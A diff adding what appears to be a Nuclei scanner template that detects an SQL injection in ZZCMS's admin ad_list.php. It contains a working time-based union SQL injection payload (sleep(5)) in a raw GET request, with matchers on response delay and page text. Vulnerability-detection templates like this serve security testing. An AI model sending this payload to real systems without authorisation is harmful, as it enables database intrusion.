@@ -1,0 +1,33 @@
+id: zzcms-ad-list-sqli
+
+info:
+  name: ZZCMS ad_list.php - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    An SQL injection vulnerability in ZZCMS ad_list.php allows attackers to execute arbitrary SQL queries via a crafted crafted GET request.
+  reference:
+    - https://github.com/wy876/POC/blob/main/zzcms/zzcms%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3ad_list.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: ZZCMS
+
+http:
+  - raw:
+      - |
+        GET /admin/ad_list.php?action=pass&&keyword='+union+SELECT+1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,sleep(5)+--+x HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Accept-Language: en
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
+        Cookie: http304ok=0; PHPSESSID=pvpehubud7epklbme9m4s69b0q;
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration > 5'
+          - 'status_code == 200'
+          - 'contains(body, "admintitle")'
+          - 'contains(body, "广告管理")'
+        condition: and
